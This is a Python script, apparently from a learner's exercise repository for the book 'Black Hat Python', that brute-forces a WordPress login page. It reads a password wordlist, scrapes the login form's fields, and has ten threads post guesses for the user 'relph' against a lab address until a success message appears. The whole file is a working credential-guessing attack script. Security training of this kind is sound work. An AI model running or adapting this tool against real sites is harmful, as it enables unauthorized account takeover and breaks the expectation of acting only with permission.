#!/usr/bin/env python
# encoding: utf-8
"""
@author: HuRuiFeng
@file: wordpress_killer.py
@time: 2022/5/24 17:02
@project: black-hat-python-2ed
@desc: P104 暴力破解HTML登录表单
"""
import threading
import time
from queue import Queue
from io import BytesIO

import requests
from lxml import etree

SUCCESS = "欢迎使用WordPress!"
# 最先下载并解析的HTML页面
TARGET = "http://192.168.56.101/wordpress/wp-login.php"
WORDLIST = "./seclists/cain-and-abel.txt"


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)

    return words


def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    # 解析content
    tree = etree.parse(BytesIO(content), parser=parser)
    # 遍历所有的input元素
    for elem in tree.findall("//input"):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)

    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f"\nBrute Force Attack beginning on {url}.\n")
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        # 初始化会话
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f"Trying username/password {self.username}/{passwd:<10}")
            params['pwd'] = passwd

            # 请求登录，如果使用最新的WordPress，已经屏蔽了重放的漏洞
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s \n" % params['pwd'])
                print("done: now cleaning up other threads...")


if __name__ == '__main__':
    words = get_words()
    b = Bruter('relph', TARGET)
    b.run_bruteforce(words)
